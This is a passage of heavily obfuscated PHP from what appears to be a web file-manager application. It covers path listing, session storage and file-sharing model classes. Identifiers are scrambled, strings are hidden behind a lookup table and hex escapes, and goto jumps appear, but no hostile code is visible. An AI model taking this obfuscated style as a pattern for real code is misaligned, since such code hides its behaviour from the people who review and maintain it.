($µÕ‡íÖì[$©àé¨ÊÆ[529]] != $«õÒ¥úÂ) { $ş¡™…æ[$©àé¨ÊÆ[489]][$©àé¨ÊÆ[490]] = $ş¡™…æ[$©àé¨ÊÆ[489]][$©àé¨ÊÆ[490]] & $µÕ‡íÖì[$©àé¨ÊÆ[489]][$©àé¨ÊÆ[489]]; } $ß¤¿ºßë = $©àé¨ÊÆ[12]; $”Ë±‰Ú = count($“û§Ö¼») - $’ıÅ³©‰; for ($—ŒÁ²¤½ = 0; $—ŒÁ²¤½ < $”Ë±‰Ú; $—ŒÁ²¤½++) { if (!isset($¼³ä¦¼í[$“û§Ö¼»[$—ŒÁ²¤½]])) { $ß¤¿ºßë = $©àé¨ÊÆ[12]; break; } $ß¤¿ºßë = $ß¤¿ºßë . rtrim($¼³ä¦¼í[$“û§Ö¼»[$—ŒÁ²¤½]], $©àé¨ÊÆ[8]) . $©àé¨ÊÆ[8]; } $ş¡™…æ[$©àé¨ÊÆ[489]][$©àé¨ÊÆ[585]] = rtrim($ß¤¿ºßë, $©àé¨ÊÆ[8]) . $©àé¨ÊÆ[8]; break; } } unset($ş¡™…æ); } public function groupPathDisplay(&$ïÑï¥£Ÿ) { $•·¯©Ö =& $_SERVER[™¸œØ®Ü]; if ($ïÑï¥£Ÿ[$•·¯©Ö[190]] != self::TYPE_GROUP) { return; } $ËÄéûÚ = Model($•·¯©Ö[589])->getInfo($ïÑï¥£Ÿ[$•·¯©Ö[573]]); $¼“Æ‡Ğ = $this->parentLevelArray($ËÄéûÚ[$•·¯©Ö[588]]); $·Ù¢úÃ = $•·¯©Ö[12]; foreach ($¼“Æ‡Ğ as $ÕÃ±åÅ) { $™å·¥Èñ = Model($•·¯©Ö[589])->getInfo($ÕÃ±åÅ); $·Ù¢úÃ .= $™å·¥Èñ[$•·¯©Ö[90]][$•·¯©Ö[193]] . $•·¯©Ö[50]; } $ïÑï¥£Ÿ[$•·¯©Ö[590]] = $ËÄéûÚ[$•·¯©Ö[192]]; $ïÑï¥£Ÿ[$•·¯©Ö[591]] = $ËÄéûÚ[$•·¯©Ö[588]]; $ïÑï¥£Ÿ[$•·¯©Ö[592]] = $ËÄéûÚ[$•·¯©Ö[593]]; $ïÑï¥£Ÿ[$•·¯©Ö[594]] = $·Ù¢úÃ . $ËÄéûÚ[$•·¯©Ö[90]][$•·¯©Ö[193]]; } protected function _listAppendPath(&$†¤ö“üÆ, $ú¾äÒ·  = false) { $‡È”®òŞ =& $_SERVER[™¸œØ®Ü]; static $ÀóÓ‘®Ã = array(); $–ÂæñÎ¼ = array(); $Èıåˆî = array(); if ($ú¾äÒ· ) { return $ÀóÓ‘®Ã; } foreach ($†¤ö“üÆ as &$Ì¡şşë) { $¶™Ë°ˆÁ = $Ì¡şşë[$‡È”®òŞ[193]]; if ($Ì¡şşë[$‡È”®òŞ[487]] == $‡È”®òŞ[91] && $Ì¡şşë[$‡È”®òŞ[192]] != 0) { $ÀóÓ‘®Ã[$¶™Ë°ˆÁ] = $Ì¡şşë[$‡È”®òŞ[32]]; } if ($Ì¡şşë[$‡È”®òŞ[487]] == $‡È”®òŞ[91] && $Ì¡şşë[$‡È”®òŞ[192]] == 0) { $ÀóÓ‘®Ã[$¶™Ë°ˆÁ] = $this->_listAppendPathRoot($Ì¡şşë, array()); } if (isset($Èıåˆî[$Ì¡şşë[$‡È”®òŞ[588]]])) { continue; } $Èıåˆî[$Ì¡şşë[$‡È”®òŞ[588]]] = !0; $¥àãÄˆ = $this->parentLevelArray($Ì¡şşë[$‡È”®òŞ[588]]); foreach ($¥àãÄˆ as $€ËºêŠ³ => $ÂƒÑ¾§ò) { if (isset($ÀóÓ‘®Ã[$ÂƒÑ¾§ò])) { continue; } if ($€ËºêŠ³ == 0) { $ÀóÓ‘®Ã[$ÂƒÑ¾§ò] = $this->_listAppendPathRoot($Ì¡şşë, $¥àãÄˆ); } if ($€ËºêŠ³ != 0) { $–ÂæñÎ¼[] = $ÂƒÑ¾§ò; } } } unset($Ì¡şşë); $–ÂæñÎ¼ = array_unique($–ÂæñÎ¼); if (count($–ÂæñÎ¼) > 0) { $úìøµïÀ = array($‡È”®òŞ[493] => array($‡È”®òŞ[494], $–ÂæñÎ¼)); if (count($–ÂæñÎ¼) == 1) { $Úì¾ò¡— = $this->sourceInfo($–ÂæñÎ¼[0]); $‘½‰Ûãİ = is_array($Úì¾ò¡—) ? array($Úì¾ò¡—) : !1; } else { $‘½‰Ûãİ = $this->field($‡È”®òŞ[595])->where($úìøµïÀ)->select(); } if (!$‘½‰Ûãİ) { $‘½‰Ûãİ = array(); } foreach ($‘½‰Ûãİ as $üº‹Áöå) { $ÀóÓ‘®Ã[$üº‹Áöå[$‡È”®òŞ[193]]] = $üº‹Áöå[$‡È”®òŞ[32]]; } } $Œ‡Ïıû÷ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Ü›†ıé¸ = array(); foreach ($†¤ö“üÆ as &$Ì¡şşë) { $©î¿ÉÄ§ = $Ì¡şşë[$‡È”®òŞ[588]]; $ü˜¢ŸÁî = $‡È”®òŞ[12]; if (isset($Ü›†ıé¸[$©î¿ÉÄ§])) { $ü˜¢ŸÁî = $Ü›†ıé¸[$©î¿ÉÄ§]; } else { $¥àãÄˆ = $this->parentLevelArray($Ì¡şşë[$‡È”®òŞ[588]]); foreach ($¥àãÄˆ as $€ËºêŠ³ => $ÂƒÑ¾§ò) { if (isset($ÀóÓ‘®Ã[$ÂƒÑ¾§ò])) { $ü˜¢ŸÁî .= $ÀóÓ‘®Ã[$ÂƒÑ¾§ò] . $‡È”®òŞ[8]; } } $Ü›†ıé¸[$©î¿ÉÄ§] = $ü˜¢ŸÁî; } $ü˜¢ŸÁî .= $Ì¡şşë[$‡È”®òŞ[32]]; if ($Ì¡şşë[$‡È”®òŞ[487]] == $‡È”®òŞ[91]) { $ü˜¢ŸÁî .= $‡È”®òŞ[8]; } $Ì¡şşë[$‡È”®òŞ[586]] = str_replace($‡È”®òŞ[256], $‡È”®òŞ[8], $ü˜¢ŸÁî); if ($Ì¡şşë[$‡È”®òŞ[192]] == $‡È”®òŞ[230]) { $Ì¡şşë[$‡È”®òŞ[32]] = trim($ÀóÓ‘®Ã[$Ì¡şşë[$‡È”®òŞ[193]]], $‡È”®òŞ[8]); $Ì¡şşë[$‡È”®òŞ[586]] = $Ì¡şşë[$‡È”®òŞ[32]] . $‡È”®òŞ[8]; } if (intval($Ì¡şşë[$‡È”®òŞ[190]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($Ì¡şşë, $¥àãÄˆ, $Œ‡Ïıû÷); } } unset($Ì¡şşë); return $†¤ö“üÆ; } private function _listAppendPathRecycle(&$ÆÓ–§Ÿ¡, $Æ–‰¿ä, $Ú‹›˜à) { $˜ä…½îØ =& $_SERVER[™¸œØ®Ü]; if (!in_array($Ú‹›˜à, $Æ–‰¿ä) && $ÆÓ–§Ÿ¡[$˜ä…½îØ[193]] != $Ú‹›˜à) { return; } $Ó¨ˆ¾‚ = explode($˜ä…½îØ[8], trim($ÆÓ–§Ÿ¡[$˜ä…½îØ[586]], $˜ä…½îØ[8])); $øÄ‚ïÔè = implode($˜ä…½îØ[8], array_slice($Ó¨ˆ¾‚, 2)); $ÆÓ–§Ÿ¡[$˜ä…½îØ[586]] = $˜ä…½îØ[8] . LNG($˜ä…½îØ[596]) . $˜ä…½îØ[8] . ltrim($øÄ‚ïÔè, $˜ä…½îØ[8]); $ÆÓ–§Ÿ¡[$˜ä…½îØ[588]] = $˜ä…½îØ[597] . implode($˜ä…½îØ[50], array_slice($Æ–‰¿ä, 1)) . $˜ä…½îØ[50]; if ($ÆÓ–§Ÿ¡[$˜ä…½îØ[193]] == $Ú‹›˜à) { $ÆÓ–§Ÿ¡[$˜ä…½îØ[588]] = $˜ä…½îØ[597]; $ÆÓ–§Ÿ¡[$˜ä…½îØ[192]] = $˜ä…½îØ[230]; $ÆÓ–§Ÿ¡[$˜ä…½îØ[32]] = LNG($˜ä…½îØ[596]); } $ÆÓ–§Ÿ¡[$˜ä…½îØ[598]] = $˜ä…½îØ[599]; } protected function _listAppendPathRoot(&$ÚœÇå¹, $†Á Î¬) { $¾Èğ‘ñ =& $_SERVER[™¸œØ®Ü]; static $œüòñ¨Ó = false; static $©–’ÜÎè = false; $Ë¨íÄ€« = $¾Èğ‘ñ[12]; if ($ÚœÇå¹[$¾Èğ‘ñ[190]] == self::TYPE_USER) { if ($ÚœÇå¹[$¾Èğ‘ñ[573]] == USER_ID) { $Ë¨íÄ€« = LNG($¾Èğ‘ñ[600]); if ($œüòñ¨Ó === !1) { $àÚÍŒš² = Model($¾Èğ‘ñ[601])->getInfoFull(USER_ID); $œüòñ¨Ó = _get($àÚÍŒš², $¾Èğ‘ñ[602], $¾Èğ‘ñ[12]); } if ($©–’ÜÎè === !1) { $àÚÍŒš² = Model($¾Èğ‘ñ[601])->getInfoFull(USER_ID); $©–’ÜÎè = _get($àÚÍŒš², $¾Èğ‘ñ[603], $¾Èğ‘ñ[12]); } if ($†Á Î¬ && $†Á Î¬[0] == $œüòñ¨Ó || !$†Á Î¬ && $ÚœÇå¹[$¾Èğ‘ñ[193]] == $œüòñ¨Ó) { $Ë¨íÄ€« = LNG($¾Èğ‘ñ[604]); $ÚœÇå¹[$¾Èğ‘ñ[605]] = $¾Èğ‘ñ[606]; } if ($†Á Î¬ && $†Á Î¬[0] == $©–’ÜÎè || !$†Á Î¬ && $ÚœÇå¹[$¾Èğ‘ñ[193]] == $©–’ÜÎè) { $Ë¨íÄ€« = $Ë¨íÄ€« . $¾Èğ‘ñ[607] . LNG($¾Èğ‘ñ[608]); } if (!$†Á Î¬) { $ÚœÇå¹[$¾Èğ‘ñ[32]] = $Ë¨íÄ€«; } } else { $àÚÍŒš² = Model($¾Èğ‘ñ[601])->getInfoFull($ÚœÇå¹[$¾Èğ‘ñ[573]]); $†”£ÖÈ¼ = _get($àÚÍŒš², $¾Èğ‘ñ[603], $¾Èğ‘ñ[12]); $ÚœÇå¹[$¾Èğ‘ñ[609]] = Model($¾Èğ‘ñ[581])->getInfoSimpleOuter($ÚœÇå¹[$¾Èğ‘ñ[573]]); $Ë¨íÄ€« = LNG($¾Èğ‘ñ[610]) . $¾Èğ‘ñ[176] . $ÚœÇå¹[$¾Èğ‘ñ[609]][$¾Èğ‘ñ[32]] . $¾Èğ‘ñ[178]; if ($†Á Î¬ && $†Á Î¬[0] == $†”£ÖÈ¼ || !$†Á Î¬ && $ÚœÇå¹[$¾Èğ‘ñ[193]] == $†”£ÖÈ¼) { $Ë¨íÄ€« = LNG($¾Èğ‘ñ[610]) . $¾Èğ‘ñ[611] . $ÚœÇå¹[$¾Èğ‘ñ[609]][$¾Èğ‘ñ[32]] . $¾Èğ‘ñ[607] . LNG($¾Èğ‘ñ[608]) . $¾Èğ‘ñ[178]; } } } else { if ($ÚœÇå¹[$¾Èğ‘ñ[190]] == self::TYPE_GROUP) { $¥ßâ˜š = Model($¾Èğ‘ñ[589])->getInfoSimple($ÚœÇå¹[$¾Èğ‘ñ[573]]); $Ë¨íÄ€« = $¥ßâ˜š[$¾Èğ‘ñ[32]]; } else { if ($ÚœÇå¹[$¾Èğ‘ñ[190]] == self::TYPE_SYSTEM) { $Ë¨íÄ€« = $¾Èğ‘ñ[612]; } } } $Ë¨íÄ€« = $Ë¨íÄ€« ? $¾Èğ‘ñ[8] . $Ë¨íÄ€« . $¾Èğ‘ñ[8] : $¾Èğ‘ñ[8]; return $Ë¨íÄ€«; } protected function _listAppendUser(&$©˜Ï™¶) { $ì–ø¯·é =& $_SERVER[™¸œØ®Ü]; $—’¼ÒãÏ = array_to_keyvalue($©˜Ï™¶, $ì–ø¯·é[12], $ì–ø¯·é[529]); $¾›ƒŒŒ‰ = array_to_keyvalue($©˜Ï™¶, $ì–ø¯·é[12], $ì–ø¯·é[531]); $óü¡åÃ = array_merge($—’¼ÒãÏ, $¾›ƒŒŒ‰); $‘ü«º­¼ = Model($ì–ø¯·é[601])->userListInfo($óü¡åÃ); foreach ($©˜Ï™¶ as &$ªˆëÈÍ) { $Ñà”¨Ö± = $ªˆëÈÍ[$ì–ø¯·é[529]]; $ªˆëÈÍ[$ì–ø¯·é[529]] = $‘ü«º­¼[$Ñà”¨Ö±] ? $‘ü«º­¼[$Ñà”¨Ö±] : !1; $Ñà”¨Ö± = $ªˆëÈÍ[$ì–ø¯·é[531]]; $ªˆëÈÍ[$ì–ø¯·é[531]] = $‘ü«º­¼[$Ñà”¨Ö±] ? $‘ü«º­¼[$Ñà”¨Ö±] : !1; if (_get($ªˆëÈÍ, $ì–ø¯·é[613], 0)) { $è©‹¿õ = $GLOBALS[$ì–ø¯·é[6]][$ì–ø¯·é[92]][$ì–ø¯·é[614]]; if ($ªˆëÈÍ[$ì–ø¯·é[543]][$ì–ø¯·é[615]] <= time() - $è©‹¿õ) { $this->metaSet($ªˆëÈÍ[$ì–ø¯·é[193]], $ì–ø¯·é[616], null); $this->metaSet($ªˆëÈÍ[$ì–ø¯·é[193]], $ì–ø¯·é[615], null); unset($ªˆëÈÍ[$ì–ø¯·é[543]][$ì–ø¯·é[616]]); continue; } $¥›éø¾¶ = $ªˆëÈÍ[$ì–ø¯·é[543]][$ì–ø¯·é[616]]; $ªˆëÈÍ[$ì–ø¯·é[543]][$ì–ø¯·é[617]] = Model($ì–ø¯·é[601])->getInfoSimpleOuter($¥›éø¾¶); } } unset($ªˆëÈÍ); } public function parentLevelArray($¦ª¦Æ¸) { $ü¢©é¬î =& $_SERVER[™¸œØ®Ü]; $¦ª¦Æ¸ = explode($ü¢©é¬î[50], trim($¦ª¦Æ¸, $ü¢©é¬î[50])); return array_remove_value($¦ª¦Æ¸, $ü¢©é¬î[230]); } public function listAll($Š“ÖÌ¼½) { $±À²›§ =& $_SERVER[™¸œØ®Ü]; $“ÔÒÉ½Ì = $this->sourceInfo($Š“ÖÌ¼½); $¨²‚üØı = array($±À²›§[618] => array($±À²›§[619], $“ÔÒÉ½Ì[$±À²›§[588]] . $Š“ÖÌ¼½ . $±À²›§[620]), $±À²›§[621] => 0); $À¦‡á„ß = $±À²›§[622]; $Òáàªéƒ = "\114\x45\x46\x54\x20\x4a\117\x49\x4e\40{$this->tablePrefix}\x69\x6f\137\x66\151\x6c\x65\x20\146\151\x6c\x65\x20\157\156\40\163\157\165\162\x63\145\56\x66\x69\x6c\x65\111\x44\40\x3d\x20\146\151\154\145\56\146\151\154\145\111\x44"; $Ü‰·úÈ = $this->alias($±À²›§[521])->field($À¦‡á„ß)->where($¨²‚üØı)->join($Òáàªéƒ)->select(); $this->_listAppendAuth($Ü‰·úÈ); $this->_listAppendUser($Ü‰·úÈ); $this->_listAppendPath($Ü‰·úÈ); $Ü‰·úÈ = array_to_keyvalue($Ü‰·úÈ, $±À²›§[193]); $²êîÀá = "\57{$“ÔÒÉ½Ì[$±À²›§[32]]}\x2f"; $²êîÀá = $²êîÀá == $±À²›§[256] ? $±À²›§[8] : $²êîÀá; $½ŸÀ”Ÿ€ = array(); foreach ($Ü‰·úÈ as $» ·Å³” => $Ş©—Ë€©) { $îÀ–éÕĞ = $this->parentLevelArray($Ş©—Ë€©[$±À²›§[588]]); array_shift($îÀ–éÕĞ); $¸ÍïÔèÌ = $²êîÀá; for ($ƒÇšÓß‡ = 0; $ƒÇšÓß‡ < count($îÀ–éÕĞ); $ƒÇšÓß‡++) { $¸ÍïÔèÌ .= $Ü‰·úÈ[$îÀ–éÕĞ[$ƒÇšÓß‡]][$±À²›§[32]] . $±À²›§[8]; } $¸ÍïÔèÌ .= $Ş©—Ë€©[$±À²›§[32]]; if ($Ş©—Ë€©[$±À²›§[487]]) { $¸ÍïÔèÌ .= $±À²›§[8]; } $âù·ÅĞ = array($±À²›§[497] => str_replace($±À²›§[256], $±À²›§[8], str_replace($±À²›§[256], $±À²›§[8], str_replace($±À²›§[256], $±À²›§[8], $¸ÍïÔèÌ))), $±À²›§[623] => intval($Ş©—Ë€©[$±À²›§[487]]), $±À²›§[624] => intval($Ş©—Ë€©[$±À²›§[79]]), $±À²›§[88] => intval($Ş©—Ë€©[$±À²›§[88]]), $±À²›§[90] => $this->pathInfoFilter($Ş©—Ë€©)); if (!$âù·ÅĞ[$±À²›§[487]]) { $âù·ÅĞ[$±À²›§[545]] = $Ş©—Ë€©[$±À²›§[545]]; } $½ŸÀ”Ÿ€[] = $âù·ÅĞ; } $½ŸÀ”Ÿ€ = array_sort_by($½ŸÀ”Ÿ€, $±À²›§[87]); return $½ŸÀ”Ÿ€; } } goto Fâ—‚–õãƒ; e‹Ú¥‡Õç–: class SessionModel extends ModelBase { protected $tableName = "\163\x79\163\x74\145\x6d\x5f\163\145\163\163\151\157\156"; public function get($è½µÌ¼) { $Ø€·´„‚ =& $_SERVER[™¸œØ®Ü]; $„¼½úÇ¹ = $this->where(array($Ø€·´„‚[2135] => $è½µÌ¼))->find(); if (!is_array($„¼½úÇ¹)) { return !1; } return $„¼½úÇ¹[$Ø€·´„‚[171]]; } public function set($ƒïı‘Ùã, $‡ÍÚîÇ½, $øúí•ÉÜ = 3600) { $‹˜ şˆ© =& $_SERVER[™¸œØ®Ü]; $î„Ô—¤î = array($‹˜ şˆ©[2135] => $ƒïı‘Ùã, $‹˜ şˆ©[2035] => $‡ÍÚîÇ½, $‹˜ şˆ©[2136] => $øúí•ÉÜ + time()); if (Session::get($‹˜ şˆ©[2137])) { $î„Ô—¤î[$‹˜ şˆ©[1795]] = Session::get($‹˜ şˆ©[2137]); } else { $î„Ô—¤î[$‹˜ şˆ©[1795]] = 0; } if ($this->get($ƒïı‘Ùã)) { return $this->where(array($‹˜ şˆ©[2135] => $ƒïı‘Ùã))->save($î„Ô—¤î); } else { return $this->add($î„Ô—¤î, array(), !0); } } public function remove($ÃÛú–ã¶) { return $this->where(array($_SERVER[™¸œØ®Ü][2135] => $ÃÛú–ã¶))->delete(); } public function clearTimeout() { return $this->where($_SERVER[™¸œØ®Ü][2138] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\150\x61\162\x65"; protected $dataAuto = array(array("\x6d\157\144\x69\146\x79\124\151\155\145", "\164\151\x6d\145", "\151\x6e\163\x65\x72\x74\x2c\x75\x70\144\141\164\x65", "\146\x75\x6e\x63\164\151\157\156"), array("\143\162\145\141\164\x65\124\151\x6d\x65", "\x74\151\x6d\x65", "\151\156\163\x65\162\164", "\146\165\x6e\143\x74\x69\x6f\x6e"), array("\x6f\160\164\151\x6f\x6e\x73", '', "\x69\x6e\x73\x65\162\164\54\x75\160\144\141\x74\145\54\163\x65\154\x65\143\164", "\152\x73\157\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($œÑÚë¬À) { $ÄÊí–£„ =& $_SERVER[™¸œØ®Ü]; $××È¿Œ = isset($œÑÚë¬À[0]) ? $œÑÚë¬À[0] : !1; $âíƒÓØü = $ÄÊí–£„[2139] . USER_ID; return array($ÄÊí–£„[2140] => array(USER_ID, $ÄÊí–£„[2141]), $ÄÊí–£„[2080] => array($××È¿Œ, $ÄÊí–£„[2142], $âíƒÓØü)); } protected function listSimple() { $·ºÄ¹™Ğ = array($_SERVER[™¸œØ®Ü][1795] => USER_ID); $”áıÓ’ê = $this->field($this->fieldList)->where($·ºÄ¹™Ğ)->select(); return $”áıÓ’ê ? $”áıÓ’ê : array(); } protected function getInfo($µ™´‡¨š, $äï¾«ëñ = false, $ÑÔ­·ßı = '') { $ğ¤ÖÚ½ =& $_SERVER[™¸œØ®Ü]; if (!$ÑÔ­·ßı) { $ÑÔ­·ßı = $ğ¤ÖÚ½[2139] . USER_ID; } if ($äï¾«ëñ) { return $this->_getShareInfo(array($ğ¤ÖÚ½[672] => $µ™´‡¨š)); } $±‚Ï×Ñ = $this->cacheFunctionGet($ğ¤ÖÚ½[2082], $µ™´‡¨š, $ÑÔ­·ßı); $ğ¤°‡æŠ = $this->shareInfoMofify($±‚Ï×Ñ, $ğ¤ÖÚ½[225]); if (isset($±‚Ï×Ñ[$ğ¤ÖÚ½[88]]) && $ğ¤°‡æŠ != $±‚Ï×Ñ[$ğ¤ÖÚ½[88]]) { $Ù»ÆãËØ = $this->cacheKeyMake($ğ¤ÖÚ½[2082], $µ™´‡¨š, $ÑÔ­·ßı); $±‚Ï×Ñ = $this->_getShareInfo(array($ğ¤ÖÚ½[672] => $µ™´‡¨š)); Cache::set($Ù»ÆãËØ, $±‚Ï×Ñ); } return $±‚Ï×Ñ; } private function shareInfoMofify(&$¨ßú¿æ‡, $µÓİ³áê = "\x67\145\164") { $³ô³®Ò‚ =& $_SERVER[™¸œØ®Ü]; if (!$¨ßú¿æ‡ || !isset($¨ßú¿æ‡[$³ô³®Ò‚[672]])) { return; } $ŸÒÁ‘‡º = $³ô³®Ò‚[2143] . $¨ßú¿æ‡[$³ô³®Ò‚[672]]; if ($µÓİ³áê == $³ô³®Ò‚[225]) { return Cache::get($ŸÒÁ‘‡º); } else { if ($µÓİ³áê == $³ô³®Ò‚[2110]) { $²è†Ü¶º = Cache::get($ŸÒÁ‘‡º); if ($²è†Ü¶º === $¨ßú¿æ‡[$³ô³®Ò‚[88]]) { return; } $¨ßú¿æ‡[$³ô³®Ò‚[2144]] = USER_ID . $³ô³®Ò‚[464] . $¨ßú¿æ‡[$³ô³®Ò‚[88]]; Cache::set($ŸÒÁ‘‡º, $¨ßú¿æ‡[$³ô³®Ò‚[88]]); } else { if ($µÓİ³áê == $³ô³®Ò‚[2145]) { Cache::remove($ŸÒÁ‘‡º); } } } } public function getInfoByHash($Ï•—Õçï) { return $this->_getShareInfo(array($_SERVER[™¸œØ®Ü][2146] => $Ï•—Õçï)); } public function getInfoByPath($ƒ°ã”¯†) { $îıŸé» =& $_SERVER[™¸œØ®Ü]; $°°Ò‚ÈÀ = array($îıŸé»[1795] => USER_ID, $îıŸé»[193] => $ƒ°ã”¯†); return $this->_getShareInfo($°°Ò‚ÈÀ); } public function getInfoBySourcePath($ìä³ŒÒ) { $Ü’ÙÃš’ =& $_SERVER[™¸œØ®Ü]; $Æ“½ñâ = array($Ü’ÙÃš’[1795] => USER_ID, $Ü’ÙÃš’[1276] => $ìä³ŒÒ); return $this->_getShareInfo($Æ“½ñâ); } private function _getShareInfo($½ª¸öÕ) { $ó»ÑüÙ› =& $_SERVER[™¸œØ®Ü]; $”¬³ãòº = $this->where($½ª¸öÕ)->find(); if (!$”¬³ãòº) { return !1; } $½ª¸öÕ = array($ó»ÑüÙ›[672] => $”¬³ãòº[$ó»ÑüÙ›[672]]); $ø¹£Ã÷ = $ó»ÑüÙ›[2147]; $¬ÜìØ = Model($ó»ÑüÙ›[673])->order($ó»ÑüÙ›[477])->field($ø¹£Ã÷)->where($½ª¸öÕ)->select(); if ($”¬³ãòº[$ó»ÑüÙ›[193]] == $ó»ÑüÙ›[230]) { $”¬³ãòº[$ó»ÑüÙ›[90]] = IO::info($”¬³ãòº[$ó»ÑüÙ›[1276]]); } else { $”¬³ãòº[$ó»ÑüÙ›[90]] = Model($ó»ÑüÙ›[1440])->pathInfo($”¬³ãòº[$ó»ÑüÙ›[193]]); } $”¬³ãòº[$ó»ÑüÙ›[2148]] = $¬ÜìØ; $this->shareInfoMofify($”¬³ãòº, $ó»ÑüÙ›[2110]); return $”¬³ãòº; } protected function getInfoAuth($”ƒ¢ñ¦ˆ) { $î«ÛñÆò =& $_SERVER[™¸œØ®Ü]; $²ú’úéú = $this->getInfo($”ƒ¢ñ¦ˆ); if ($²ú’úéú[$î«ÛñÆò[1795]] == USER_ID) { $²ú’úéú[$î«ÛñÆò[489]] = $²ú’úéú[$î«ÛñÆò[90]][$î«ÛñÆò[489]]; } else { $²ú’úéú[$î«ÛñÆò[489]] = Model($î«ÛñÆò[571])->authMake($²ú’úéú[$î«ÛñÆò[2148]]); } return $²ú’úéú; } protected function listData($­ÊÊõë = null, $şøíØéò = 300) { $ ò™Äù =& $_SERVER[™¸œØ®Ü]; $›ïãáÑ™ = array(array($ ò™Äù[566] => array($ ò™Äù[1108], 0), $ ò™Äù[670] => array($ ò™Äù[1108], 0), $ ò™Äù[2149] => $ ò™Äù[2098])); if ($­ÊÊõë == $ ò™Äù[2150]) { $›ïãáÑ™ = array($ ò™Äù[566] => 1); } else { if ($­ÊÊõë == $ ò™Äù[1261]) { $›ïãáÑ™ = array($ ò™Äù[670] => 1); } } $›ïãáÑ™[$ ò™Äù[1795]] = USER_ID; $ûĞî ˜ = $this->where($›ïãáÑ™)->selectPage($şøíØéò); return $ûĞî ˜; } protected function listToMe($òÏœ–¯ø = 300) { $ÈËşÈŒ  =& $_SERVER[™¸œØ®Ü]; $¢—Á©İƒ = Model($ÈËşÈŒ [2151])->userGroupParents(USER_ID); $«’ù‡°¸ = array($ÈËşÈŒ [655] => SourceModel::TYPE_USER, $ÈËşÈŒ [573] => USER_ID); if ($¢—Á©İƒ) { $«’ù‡°¸ = array(array($ÈËşÈŒ [655] => SourceModel::TYPE_USER, $ÈËşÈŒ [573] => USER_ID), array($ÈËşÈŒ [655] => SourceModel::TYPE_GROUP, $ÈËşÈŒ [573] => array($ÈËşÈŒ [7], $¢—Á©İƒ)), $ÈËşÈŒ [2149] => $ÈËşÈŒ [2098]); } $ù’õÑ¯ç = Model($ÈËşÈŒ [673])->where($«’ù‡°¸)->selectPage($òÏœ–¯ø); $úı·È½ = array_to_keyvalue_group($ù’õÑ¯ç[$ÈËşÈŒ [447]], $ÈËşÈŒ [672]); if (!$úı·È½) { return $ù’õÑ¯ç; } $³§”¡› = $ÈËşÈŒ [2152]; $«’ù‡°¸ = array($ÈËşÈŒ [672] => array($ÈËşÈŒ [494], array_keys($úı·È½)), $ÈËşÈŒ [1795] => array($ÈËşÈŒ [1110], $ÈËşÈŒ [230])); $¥Ãù’· = $this->field($³§”¡›)->where($«’ù‡°¸)->select(); foreach ($¥Ãù’· as $Êğè¾Üú => &$ˆŒ®âÍ) { $ˆŒ®âÍ[$ÈËşÈŒ [2148]] = $úı·È½[$ˆŒ®âÍ[$ÈËşÈŒ [672]]]; } unset($ˆŒ®âÍ); $ôäµß•œ = array($ÈËşÈŒ [2153] => $¥Ãù’·, $ÈËşÈŒ [2154] => $ù’õÑ¯ç[$ÈËşÈŒ [444]]); return $ôäµß•œ; } protected function shareAdd($©¶ƒÌÄ», $´ıËÊ©ô) { $‹˜½ï‘  =& $_SERVER[™¸œØ®Ü]; $¸Èõ’ = $this->_addShareData($©¶ƒÌÄ», $´ıËÊ©ô); if (!empty($´ıËÊ©ô[$‹˜½ï‘ [2155]])) { $this->_shareAuthSet($¸Èõ’, $´ıËÊ©ô[$‹˜½ï‘ [2155]]); } $this->shareEventAdd($©¶ƒÌÄ», $´ıËÊ©ô, $‹˜½ï‘ [2156]); return $¸Èõ’; } protected function shareAddSystem($½—‰×âÃ, $ƒ¹Êµà¼) { $»¢’„…¢ =& $_SERVER[™¸œØ®Ü]; $òÓ‹‘ªÍ = $this->_addShareData($½—‰×âÃ, $ƒ¹Êµà¼, $»¢’„…¢[191]); $this->_shareAuthSet($òÓ‹‘ªÍ, $ƒ¹Êµà¼[$»¢’„…¢[2155]]); return $òÓ‹‘ªÍ; } private function shareEventAdd($·µœù”‹, $Ù¹œ“ØŠ, $ªÙø¢åş = "\141\144\x64") { $‡Ÿ·Ô»¶ =& $_SERVER[™¸œØ®Ü]; if (!$·µœù”‹ || $·µœù”‹ == $‡Ÿ·Ô»¶[230]) { return; } if ($ªÙø¢åş == $‡Ÿ·Ô»¶[2156]) { if ($Ù¹œ“ØŠ[$‡Ÿ·Ô»¶[566]] == $‡Ÿ·Ô»¶[91]) { Model($‡Ÿ·Ô»¶[640])->eventShare($·µœù”‹, $‡Ÿ·Ô»¶[2157]); } if ($Ù¹œ“ØŠ[$‡Ÿ·Ô»¶[670]] == $‡Ÿ·Ô»¶[91]) { Model($‡Ÿ·Ô»¶[640])->eventShare($·µœù”‹, $‡Ÿ·Ô»¶[2158]); } return; } $È¡æ„Øğ = $this->getInfoByPath($·µœù”‹); $Ê†¥Î‚ = $‡Ÿ·Ô»¶[2159]; if ($È¡æ„Øğ[$‡Ÿ·Ô»¶[566]] == $‡Ÿ·Ô»¶[230] && $Ù¹œ“ØŠ[$‡Ÿ·Ô»¶[566]] == $‡Ÿ·Ô»¶[91]) { $Ê†¥Î‚ = $‡Ÿ·Ô»¶[2157]; } if ($È¡æ„Øğ[$‡Ÿ·Ô»¶[566]] == $‡Ÿ·Ô»¶[91] && $Ù¹œ“ØŠ[$‡Ÿ·Ô»¶[566]] == $‡Ÿ·Ô»¶[230]) { $Ê†¥Î‚ = $‡Ÿ·Ô»¶[2160]; } if ($È¡æ„Øğ[$‡Ÿ·Ô»¶[670]] == $‡Ÿ·Ô»¶[230] && $Ù¹œ“ØŠ[$‡Ÿ·Ô»¶[670]] == $‡Ÿ·Ô»¶[91]) { $Ê†¥Î‚ = $‡Ÿ·Ô»¶[2158]; } if ($È¡æ„Øğ[$‡Ÿ·Ô»¶[670]] == $‡Ÿ·Ô»¶[91] && $Ù¹œ“ØŠ[$‡Ÿ·Ô»¶[670]] == $‡Ÿ·Ô»¶[230]) { $Ê†¥Î‚ = $‡Ÿ·Ô»¶[2161]; } Model($‡Ÿ·Ô»¶[640])->eventShare($·µœù”‹, $Ê†¥Î‚); return; } private function _addShareData($úŞí†ü, $Ò›¬»©ê = array(), $ô¶¶¨Ç˜ = false) { $ëËÆå =& $_SERVER[™¸œØ®Ü]; $è‘—Ã½¼ = $ô¶¶¨Ç˜ == $ëËÆå[191] ? 0 : USER_ID; $‹ÒšŞŸ† = array($ëËÆå[493] => $úŞí†ü, $ëËÆå[1786] => $è‘—Ã½¼); if 